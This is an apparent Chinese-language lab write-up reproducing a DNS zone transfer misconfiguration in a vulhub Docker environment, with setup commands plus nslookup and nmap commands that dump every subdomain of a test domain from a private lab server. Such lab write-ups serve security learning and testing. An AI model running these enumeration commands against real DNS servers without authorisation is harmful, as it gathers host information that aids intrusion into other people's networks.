DNS Zone
Transfers（DNS区域传输）是指一台备用服务器使用主服务器的数据来刷新自己的域数据库，其目的是为了防止主域名服务器因意外故障尔影响到整个域名的解析。当主服务器出现故障时，备用服务器就会顶替主服务器而提供域名解析服务。当DNS服务器被错误设置成只要有client发出请求，就会向对方提供一个z域数据库的详细信息时，就产生了DNS域传送漏洞。通过该漏洞，测试人员可以快速收集某个特定域信息，主机信息。

本文仅作漏洞复现记录与实现，利用流程如下:

## 1.漏洞信息

本环境使用vulhub进行搭建，依次执行以下命令完成搭建

    
    
    cd vulhub/dns/dns-zone-transfer/
    
    docker-compose up -d

稍等片刻就可以看到开启了udp与tcp协议的53端口

![1616840527_605f074fa150ea48572cc.png!small](https://image.3001.net/images/20210327/1616840527_605f074fa150ea48572cc.png!small)

目标: 192.168.101.152:53

## 2.利用流程

在Windows使用nslookup工具，依次执行以下指令

    
    
    nslookup
    
    set type=soa
    
    server 192.168.101.152
    
    ls -d vulhub.org

![1616840684_605f07ecc5526c316ede7.png!small](https://image.3001.net/images/20210327/1616840684_605f07ecc5526c316ede7.png!small)

可以看到，成功获取到了vulhub.org的所有子域名

也可以使用nmap进行扫描

    
    
    nmap --script dns-zone-transfer.nse --script-args "dns-zone-transfer.domain=vulhub.org" -Pn -p 53 192.168.101.152

![1616840835_605f0883502d8e03942e7.png!small](https://image.3001.net/images/20210327/1616840835_605f0883502d8e03942e7.png!small)

到此文章结束

